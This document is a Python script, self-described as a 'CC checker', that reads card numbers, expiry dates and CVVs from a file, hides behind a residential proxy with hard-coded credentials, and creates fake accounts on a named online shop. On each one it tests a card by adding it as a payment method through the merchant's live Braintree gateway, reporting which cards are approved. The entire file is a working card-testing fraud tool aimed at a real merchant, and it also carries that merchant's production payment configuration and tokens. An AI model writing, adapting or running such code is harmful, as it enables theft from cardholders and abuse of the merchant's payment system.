import requests
from bs4 import BeautifulSoup
import html
import re
import base64
import time
import random
import string

def generate_random_user_email():
    # Generate a random username with 6 to 10 lowercase letters and digits
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(6, 10)))
    number_suffix = str(random.randint(1000, 9999))
    email = f"{username}{number_suffix}@gmail.com"
    print(f"[DEBUG] Generated username: {username}, email: {email}")
    return username, email

def get_fixed_proxy():
    host = "rp.scrapegw.com"
    port = "6060"
    user = "ie3ieg1qrz2kxh6-country-de"
    password = "vr4lycad71fgnoj"
    proxy_url = f"http://{user}:{password}@{host}:{port}"
    print(f"[DEBUG] Using fixed proxy: {proxy_url}")
    return {
        'http': proxy_url,
        'https': proxy_url
    }

def split_cc_details(cc_line):
    """Split a CC line into its components"""
    parts = cc_line.strip().split('|')
    if len(parts) != 4:
        raise ValueError(f"Invalid CC format. Expected 'card|mm|yyyy|cvv', got: {cc_line}")
    print(f"[DEBUG] Split CC details: {parts}")
    return {
        'number': parts[0],
        'exp_month': parts[1],
        'exp_year': parts[2],
        'cvv': parts[3]
    }

def process_cc(cc_details, proxy=None):
    print(f"\n[DEBUG] Starting processing for CC: {cc_details['number']}|{cc_details['exp_month']}|{cc_details['exp_year']}|{cc_details['cvv']}")
    session = requests.Session()
    if proxy:
        session.proxies.update(proxy)
        print(f"[DEBUG] Proxy set for session")

    headers = {
        'Referer': 'https://www.calipercovers.com/',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
    }

    print("[DEBUG] Sending GET to /my-account/")
    response = session.get('https://www.calipercovers.com/my-account/', headers=headers)
    print(f"[DEBUG] /my-account/ response status: {response.status_code}")
    if response.status_code != 200:
        print(f"❌ Dead proxy or blocked: HTTP {response.status_code}. Skipping this CC.")
        return

    soup = BeautifulSoup(response.text, 'html.parser')
    nonce = soup.find(id="woocommerce-register-nonce")
    if not nonce:
        print("[DEBUG] Woocommerce register nonce not found!")
        return

    username, email = generate_random_user_email()

    headers = {
        'authority': 'www.calipercovers.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.calipercovers.com',
        'referer': 'https://www.calipercovers.com/my-account/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    }

    data = {
        'username': username,
        'email': email,
        'wfls-email-verification': '',
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://www.calipercovers.com/',
        'wc_order_attribution_session_start_time': '2025-07-31 08:46:25',
        'wc_order_attribution_session_pages': '8',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        'woocommerce-register-nonce': nonce["value"],
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }

    print("[DEBUG] Submitting registration POST")
    response = session.post('https://www.calipercovers.com/my-account/', headers=headers, data=data)
    print(f"[DEBUG] Registration POST response status: {response.status_code}")

    headers = {
        'authority': 'www.calipercovers.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'referer': 'https://www.calipercovers.com/my-account/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    }

    print("[DEBUG] Getting payment method page")
    response = session.get('https://www.calipercovers.com/my-account/payment-methods/', headers=headers)
    print(f"[DEBUG] Payment methods page response status: {response.status_code}")

    print("[DEBUG] Getting add payment method page")
    response = session.get('https://www.calipercovers.com/my-account/add-payment-method/', headers=headers)
    print(f"[DEBUG] Add payment method page response status: {response.status_code}")

    html_text = response.text

    match = re.search(r'var wc_braintree_client_token\s*=\s*\[\s*"([^"]+)"\s*\];', html_text)
    if match:
        client_token = match.group(1)
        print("[DEBUG] Found wc_braintree_client_token")
    else:
        print("❌ wc_braintree_client_token not found!")
        return

    decoded_token = base64.b64decode(client_token).decode('utf-8')

    match = re.search(r'authorizationFingerprint":"([^"]+)"', decoded_token)
    if match:
        at = match.group(1)
        print("[DEBUG] Extracted authorizationFingerprint")
    else:
        print("authorizationFingerprint not found!")
        return

    soup = BeautifulSoup(response.text, 'html.parser')

    nonce1 = soup.find(id="woocommerce-add-payment-method-nonce")
    if not nonce1:
        print("[DEBUG] Woocommerce add payment method nonce not found!")
        return

    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': f'Bearer {at}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': '55a03f4b-9c62-406f-a058-5cebde2fc5c8',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': cc_details['number'],
                    'expirationMonth': cc_details['exp_month'],
                    'expirationYear': cc_details['exp_year'],
                    'cvv': cc_details['cvv'],
                    'billingAddress': {
                        'postalCode': '10080',
                        'streetAddress': '',
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    print("[DEBUG] Sending tokenization request to Braintree API")
    response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    print(f"[DEBUG] Braintree tokenization response status: {response.status_code}")

    try:
        tok = response.json()['data']['tokenizeCreditCard']['token']
        print("[DEBUG] Received token from Braintree")
    except Exception as e:
        print(f"❌ Error getting token from Braintree response: {e}")
        return

    headers = {
        'authority': 'www.calipercovers.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.calipercovers.com',
        'referer': 'https://www.calipercovers.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    }

    data = {
        'payment_method': 'braintree_cc',
        'braintree_cc_nonce_key': tok,
        'braintree_cc_device_data': '{"device_session_id":"c77869fd8e86de8ba91cc4438b8bfdbc","fraud_merchant_id":null,"correlation_id":"3a4647d6-d89f-4dfc-92c9-74c71b5e"}',
        'braintree_cc_3ds_nonce_key': '',
        'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/dqh5nxvnwvm2qqjh/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/dqh5nxvnwvm2qqjh"},"merchantId":"dqh5nxvnwvm2qqjh","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Bestop Premium Accessories Group","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTMxMjkxNzQsImp0aSI6IjA5OTE5YmE0LTBiZDYtNDU3OC04N2VlLWNhMjMxOTBiNGYxMiIsInN1YiI6ImRxaDVueHZud3ZtMnFxamgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImRxaDVueHZud3ZtMnFxamgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.V8rS9pZ_b_ytVi23rQ0-l-ztXaCbqBgnrCtjrBa7SsdCLEz0T9oo3lSb5dM7sb4_HJ_3nWcy6X69rGcgY2k7BQ","paypalClientId":"Aanbm5zGT-CMkR5AJKJ9R0LktPqlXIozDCC53LCa23sAUwtjDAjwG3plTmG7-DjtR3cFuvp4JJ-FwV5e","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"4042552878213091679","accessToken":"access_token$production$dqh5nxvnwvm2qqjh$d9918bec102e9ab038971ac225e91fc1","environment":"production","enrichedCustomerDataEnabled":true},"paypalEnabled":true,"paypal":{"displayName":"Bestop Premium Accessories Group","clientId":"Aanbm5zGT-CMkR5AJKJ9R0LktPqlXIozDCC53LCa23sAUwtjDAjwG3plTmG7-DjtR3cFuvp4JJ-FwV5e","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"bestoppremiumaccessoriesgroup_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
        'woocommerce-add-payment-method-nonce': nonce1["value"],
        '_wp_http_referer': '/my-account/add-payment-method/',
        'woocommerce_add_payment_method': '1',
    }

    print("[DEBUG] Adding payment method POST")
    response = session.post(
        'https://www.calipercovers.com/my-account/add-payment-method/',
        headers=headers,
        data=data,
    )
    print(f"[DEBUG] Add payment method response status: {response.status_code}")

    text = response.text
    soup = BeautifulSoup(text, 'html.parser')

    if 'Payment method successfully added.' in text:
        print("APPROVED ✅️")
    else:
        error_ul = soup.find('ul', class_='woocommerce-error')
        if error_ul:
            full_error_text = error_ul.get_text(strip=True)
            match = re.search(r'Reason:\s*(.*)', full_error_text)
            if match:
                reason = match.group(1).strip()
                print(f"❌ Declined - Reason: {reason}")
            else:
                print(f"❌ Declined - {full_error_text}")
        else:
            print("❓ No success or error message found.\n")

def main():
    use_proxy = input("🛡️ Do you want to continue with proxy? (y/n): ").strip().lower() == 'y'

    try:
        with open('cc.txt', 'r') as f:
            cc_lines = f.readlines()
        print(f"[DEBUG] Loaded {len(cc_lines)} cards from cc.txt")
    except FileNotFoundError:
        print("❌ cc.txt file not found in current directory")
        return

    for idx, cc_line in enumerate(cc_lines, 1):
        print(f"[DEBUG] Processing card {idx}/{len(cc_lines)}")
        try:
            cc_details = split_cc_details(cc_line)
            proxy = get_fixed_proxy() if use_proxy else None
            process_cc(cc_details, proxy)
        except Exception as e:
            print(f"❌ Error processing CC: {e}")
            continue
        time.sleep(4)  # 4 seconds delay

if __name__ == "__main__":
    print("Starting CC checker...")
    main()
    print("\nProcessing complete.")
